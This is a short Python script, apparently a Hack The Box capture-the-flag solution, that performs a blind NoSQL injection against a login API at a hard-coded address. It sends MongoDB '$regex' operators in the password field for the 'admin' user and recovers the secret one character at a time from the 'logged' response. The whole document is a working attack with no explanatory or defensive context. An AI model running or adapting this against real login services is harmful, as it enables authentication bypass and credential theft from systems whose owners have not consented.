import requests
import json
import string
from concurrent.futures import ThreadPoolExecutor

url = "http://83.136.251.226:48872/api/login"  # Substitua pela URL real
headers = {
    "Content-Type": "application/json",
	"Host": "83.136.251.226:48872",
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
	"Accept": "*/*",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate, br",
	"Referer": "http://83.136.251.226:48872",
	"Content-Type": "application/json",
	"Content-Length": "65",
	"Origin": "http://83.136.251.226:48872",
	"DNT": "1",
	"Connection": "close",
}

proxies = {
  "http": "http://127.0.0.1:8080",
}

def fazer_requisicao(regex):
    data = {
        "username": {"$eq": "admin"},
        "password": {"$regex": "^HTB" + regex}
    }
    response = requests.post(url, headers=headers, data=json.dumps(data), proxies=proxies)
    resultado = response.json()
    return resultado



def brute_force():
	regexy = ""
	caracteres = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
	with ThreadPoolExecutor(max_workers=20) as executor:
		while '}' not in regexy:
			for i in range(len(caracteres)):
				regex = regexy + caracteres[i]
				req = fazer_requisicao(regex)
				if req["logged"] == 1:
					regexy = regex  # Inclui o próximo caractere na regex
					print(f"Encontrado: {regexy}\n")  # Imprime o resultado encontrado
				else:
					continue  # Se nenhum resultado for encontrado, interrompe o loop

if __name__ == "__main__":
    brute_force()